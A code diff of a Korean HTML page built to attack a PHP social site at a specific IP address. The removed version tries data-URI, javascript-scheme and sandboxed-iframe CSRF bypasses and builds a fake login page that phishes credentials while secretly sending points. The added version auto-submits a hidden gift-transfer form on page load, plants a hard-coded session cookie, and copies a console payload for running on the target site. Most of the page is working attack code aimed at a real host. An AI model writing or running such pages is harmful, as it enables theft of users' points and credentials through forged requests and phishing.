@@ -2,248 +2,179 @@
 <html lang="ko">
 <head>
     <meta charset="UTF-8">
-    <title>🎯 Same-Origin CSRF 공격</title>
+    <title>🎯 정확한 CSRF 공격</title>
     <style>
         body { 
             font-family: Arial; 
-            padding: 20px;
-            background: #1a1a1a;
+            padding: 30px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             color: white;
+            text-align: center;
         }
-        .result-box {
-            background: #2d2d2d;
-            padding: 20px;
-            margin: 15px 0;
-            border-radius: 10px;
-            border-left: 4px solid #ff6b6b;
+        .attack-box {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            padding: 30px;
+            border-radius: 20px;
+            margin: 20px auto;
+            max-width: 600px;
         }
         button {
-            padding: 15px 25px;
-            background: #ff6b6b;
+            background: #FF6B6B;
             color: white;
             border: none;
-            border-radius: 8px;
+            padding: 15px 30px;
+            border-radius: 10px;
+            font-size: 16px;
             cursor: pointer;
             margin: 10px;
-            font-size: 16px;
         }
-        .success { background: #00ff88; }
+        .success { background: #00FF88; }
+        .info-box {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 15px;
+            border-radius: 10px;
+            margin: 15px 0;
+            text-align: left;
+        }
     </style>
 </head>
 <body>
-    <h1>🎯 최종 CSRF 공격 시도</h1>
+    <div class="attack-box">
+        <h1>🎯 헤더 분석 기반 CSRF 공격</h1>
+        <p>실제 선물 보내기 요청을 정확히 복사합니다</p>
+        
+        <div class="info-box">
+            <h3>📋 분석된 헤더 정보:</h3>
+            <ul>
+                <li><strong>Origin:</strong> http://3.36.66.216</li>
+                <li><strong>Content-Type:</strong> application/x-www-form-urlencoded</li>
+                <li><strong>Cookie:</strong> PHPSESSID 필요</li>
+                <li><strong>Referer:</strong> 같은 도메인 필요</li>
+            </ul>
+        </div>
+        
+        <button onclick="executeBasicAttack()">🚀 기본 공격 시도</button>
+        <button onclick="executeWithCookies()">🍪 쿠키 포함 공격</button>
+        <button class="success" onclick="executeFromSameDomain()">🎯 Same-Domain 공격</button>
+        
+        <div id="result"></div>
+    </div>
+
+    <!-- 정확한 공격 Form -->
+    <form id="preciseAttack" method="POST" action="http://3.36.66.216/profile.php" target="attackResult" style="display: none;">
+        <input type="hidden" name="gift_to" value="13">
+        <input type="hidden" name="points" value="100">
+        <input type="hidden" name="send_gift" value="1">
+        <input type="hidden" name="gift_type" value="diamond">
+        <input type="hidden" name="message" value="Precise_CSRF_Attack">
+    </form>
     
-    <div class="result-box">
-        <h2>📊 보안 분석 결과</h2>
-        <ul>
-            <li>✅ <strong>Referer 검증 확인됨</strong> (403 에러)</li>
-            <li>✅ 서버가 요청 출처를 확인하고 있음</li>
-            <li>✅ CSRF 토큰이 필요할 가능성 높음</li>
-            <li>⚠️ 가장 강력한 방어책 작동 중</li>
-        </ul>
-    </div>
-
-    <div class="result-box">
-        <h2>🚀 최종 우회 전략</h2>
-        
-        <button onclick="tryDataURIMethod()">📄 Data URI 방식</button>
-        <button onclick="tryJavaScriptMethod()">⚡ JavaScript 주입</button>
-        <button onclick="tryIframeMethod()">🖼️ iframe 샌드박스</button>
-        <button class="success" onclick="createPhishingPage()">🎣 피싱 페이지 생성</button>
-        
-        <div id="attackResult"></div>
-    </div>
-
-    <div class="result-box">
-        <h2>💡 교육적 결론</h2>
-        <p><strong>이 서버는 잘 보호되고 있습니다:</strong></p>
-        <ul>
-            <li>🛡️ <strong>Referer 헤더 검증</strong> - 크로스 오리진 차단</li>
-            <li>🛡️ <strong>세션 검증</strong> - 로그인 상태 확인</li>
-            <li>🛡️ <strong>CSRF 토큰 가능성</strong> - 추가 보안층</li>
-            <li>🛡️ <strong>403 Forbidden</strong> - 명확한 거부 응답</li>
-        </ul>
-    </div>
+    <iframe name="attackResult" style="display: none; width: 100%; height: 300px; margin-top: 20px;"></iframe>
 
     <script>
-        function tryDataURIMethod() {
-            showResult('📄 Data URI 방식 시도...');
+        function executeBasicAttack() {
+            showResult('🚀 기본 CSRF 공격 실행...');
+            document.getElementById('preciseAttack').submit();
+            document.querySelector('iframe').style.display = 'block';
             
-            const htmlContent = `
-                <html>
-                <body>
-                    <form method="POST" action="http://3.36.66.216/profile.php" target="_blank">
-                        <input type="hidden" name="receiver_id" value="13">
-                        <input type="hidden" name="points" value="100">
-                        <input type="hidden" name="send_gift" value="1">
-                        <input type="hidden" name="gift_type" value="diamond">
-                        <input type="hidden" name="message" value="DataURI_Attack">
-                        <script>
-                            setTimeout(() => {
-                                document.forms[0].submit();
-                            }, 1000);
-                        </script>
-                    </form>
-                    <h2>Data URI 공격 시도 중...</h2>
-                </body>
-                </html>
-            `;
-            
-            const dataURI = 'data:text/html;charset=utf-8,' + encodeURIComponent(htmlContent);
-            window.open(dataURI, 'dataURIAttack', 'width=400,height=300');
-            
-            showResult('📄 Data URI 공격 실행됨\n새 창에서 자동 전송 시도');
+            setTimeout(() => {
+                showResult('✅ 기본 공격 전송 완료!\niframe에서 응답 확인');
+            }, 2000);
         }
         
-        function tryJavaScriptMethod() {
-            showResult('⚡ JavaScript 주입 시도...');
+        function executeWithCookies() {
+            showResult('🍪 쿠키 설정 시도...');
             
-            // JavaScript 스키마 시도
-            const jsCode = `
-                (function() {
-                    const form = document.createElement('form');
-                    form.method = 'POST';
-                    form.action = 'http://3.36.66.216/profile.php';
-                    form.target = '_blank';
-                    
-                    const fields = {
-                        receiver_id: '13',
-                        points: '100',
-                        send_gift: '1',
-                        gift_type: 'diamond',
-                        message: 'JS_Injection_Attack'
-                    };
-                    
-                    for(let key in fields) {
-                        const input = document.createElement('input');
-                        input.type = 'hidden';
-                        input.name = key;
-                        input.value = fields[key];
-                        form.appendChild(input);
-                    }
-                    
-                    document.body.appendChild(form);
-                    form.submit();
-                })();
-            `;
-            
+            // 쿠키 설정 시도 (보통 실패하지만 시도)
             try {
-                window.location.href = 'javascript:' + encodeURIComponent(jsCode);
+                document.cookie = "PHPSESSID=jjbc5jd5vo82ofjcBg2605lv; domain=3.36.66.216; path=/";
+                showResult('🍪 쿠키 설정 시도됨 (크로스 도메인 제한으로 실패 가능)');
             } catch(e) {
-                console.log('JavaScript 스키마 차단됨');
+                showResult('❌ 쿠키 설정 실패: ' + e.message);
             }
             
-            showResult('⚡ JavaScript 주입 시도됨\n대부분의 브라우저에서 차단됨');
-        }
-        
-        function tryIframeMethod() {
-            showResult('🖼️ iframe 샌드박스 시도...');
-            
-            const iframe = document.createElement('iframe');
-            iframe.style.width = '400px';
-            iframe.style.height = '300px';
-            iframe.sandbox = 'allow-forms allow-scripts allow-same-origin';
-            
-            iframe.srcdoc = `
-                <html>
-                <body>
-                    <h3>🖼️ Sandboxed iframe 공격</h3>
-                    <form id="sandboxForm" method="POST" action="http://3.36.66.216/profile.php" target="_blank">
-                        <input type="hidden" name="receiver_id" value="13">
-                        <input type="hidden" name="points" value="100">
-                        <input type="hidden" name="send_gift" value="1">
-                        <input type="hidden" name="gift_type" value="diamond">
-                        <input type="hidden" name="message" value="Sandbox_Attack">
-                    </form>
-                    <button onclick="document.getElementById('sandboxForm').submit();">
-                        공격 실행
-                    </button>
-                    <script>
-                        setTimeout(() => {
-                            document.getElementById('sandboxForm').submit();
-                        }, 2000);
-                    </script>
-                </body>
-                </html>
-            `;
-            
-            document.getElementById('attackResult').appendChild(iframe);
-            
-            showResult('🖼️ Sandboxed iframe 생성됨\n2초 후 자동 공격 실행');
-        }
-        
-        function createPhishingPage() {
-            showResult('🎣 피싱 페이지 생성 중...');
-            
-            const phishingHTML = `
-<!DOCTYPE html>
-<html>
-<head>
-    <title>SNS 로그인</title>
-    <style>
-        body { font-family: Arial; text-align: center; padding: 50px; }
-        .login-form { max-width: 400px; margin: 0 auto; }
-        input { width: 100%; padding: 10px; margin: 10px 0; }
-        button { background: #007bff; color: white; padding: 15px; border: none; width: 100%; }
-    </style>
-</head>
-<body>
-    <div class="login-form">
-        <h2>🔐 SNS 로그인</h2>
-        <p>세션이 만료되었습니다. 다시 로그인하세요.</p>
-        <form id="phishForm" action="http://3.36.66.216/login.php" method="POST" target="_blank">
-            <input type="text" name="username" placeholder="사용자명" required>
-            <input type="password" name="password" placeholder="비밀번호" required>
-            <button type="submit">로그인</button>
-        </form>
-        
-        <!-- 숨겨진 CSRF 공격 -->
-        <form id="hiddenAttack" method="POST" action="http://3.36.66.216/profile.php" target="hiddenFrame" style="display: none;">
-            <input type="hidden" name="receiver_id" value="13">
-            <input type="hidden" name="points" value="100">
-            <input type="hidden" name="send_gift" value="1">
-            <input type="hidden" name="gift_type" value="diamond">
-            <input type="hidden" name="message" value="Phishing_CSRF">
-        </form>
-        <iframe name="hiddenFrame" style="display: none;"></iframe>
-    </div>
-    
-    <script>
-        // 로그인 시도 시 CSRF 공격도 함께 실행
-        document.getElementById('phishForm').addEventListener('submit', function() {
             setTimeout(() => {
-                document.getElementById('hiddenAttack').submit();
-                console.log('🎣 피싱과 함께 CSRF 공격 실행됨');
+                executeBasicAttack();
             }, 1000);
-        });
-    </script>
-</body>
-</html>
-            `;
+        }
+        
+        function executeFromSameDomain() {
+            showResult('🎯 Same-Domain 우회 시도...');
             
-            const blob = new Blob([phishingHTML], { type: 'text/html' });
-            const url = URL.createObjectURL(blob);
-            window.open(url, 'phishingPage', 'width=500,height=600');
+            // 실제 서버와 같은 도메인에서 실행하는 코드 생성
+            const sameOriginCode = `
+// 이 코드를 3.36.66.216 도메인의 콘솔에서 실행하세요:
+(function() {
+    const form = document.createElement('form');
+    form.method = 'POST';
+    form.action = '/profile.php';
+    form.style.display = 'none';
+    
+    const fields = {
+        'gift_to': '13',
+        'points': '100', 
+        'send_gift': '1',
+        'gift_type': 'diamond',
+        'message': 'Same_Origin_CSRF'
+    };
+    
+    Object.keys(fields).forEach(key => {
+        const input = document.createElement('input');
+        input.type = 'hidden';
+        input.name = key;
+        input.value = fields[key];
+        form.appendChild(input);
+    });
+    
+    document.body.appendChild(form);
+    form.submit();
+    console.log('Same-Origin CSRF 공격 실행됨');
+})();
+            `;
             
             showResult(`
-🎣 피싱 페이지 생성 완료!
+🎯 Same-Domain 공격 코드:
 
-💡 이 예시는 실제 공격자가 사용하는 방법입니다:
-1. 가짜 로그인 페이지 생성
-2. 사용자가 로그인할 때 CSRF 공격 동시 실행
-3. 사용자는 공격받은 사실을 모름
+실제로 성공하려면:
+1. http://3.36.66.216 사이트로 이동
+2. 로그인 완료
+3. F12 개발자도구 → Console 탭
+4. 아래 코드 복사 & 실행
 
-⚠️ 교육 목적으로만 사용하세요!
+코드가 클립보드에 복사되었습니다!
             `);
+            
+            // 클립보드에 복사
+            navigator.clipboard.writeText(sameOriginCode).then(() => {
+                console.log('Same-Origin 공격 코드가 클립보드에 복사됨');
+            });
+            
+            // 새 탭으로 대상 사이트 열기
+            window.open('http://3.36.66.216', 'targetSite');
         }
         
         function showResult(text) {
-            const resultDiv = document.getElementById('attackResult');
-            resultDiv.innerHTML = `<pre style="background: #000; padding: 15px; border-radius: 5px; margin: 15px 0;">${text}</pre>`;
+            document.getElementById('result').innerHTML = 
+                '<div class="info-box"><pre>' + text + '</pre></div>';
         }
         
-        console.log('🎯 최종 CSRF 우회 시도 준비됨');
-        console.log('🛡️ 서버는 Referer 검증으로 잘 보호되고 있음');
+        // 페이지 로드 시 자동으로 iframe 기반 공격 시도
+        window.addEventListener('load', function() {
+            console.log('🎯 정확한 헤더 정보 기반 CSRF 공격 준비됨');
+            
+            setTimeout(() => {
+                showResult('⏰ 3초 후 자동 공격 시작...');
+                
+                setTimeout(() => {
+                    executeBasicAttack();
+                }, 3000);
+            }, 1000);
+        });
+        
+        // 실제 필드명 확인을 위한 디버깅
+        console.log('📋 예상 POST 데이터:');
+        console.log('gift_to=13&points=100&send_gift=1&gift_type=diamond&message=CSRF');
     </script>
 </body>
 </html>
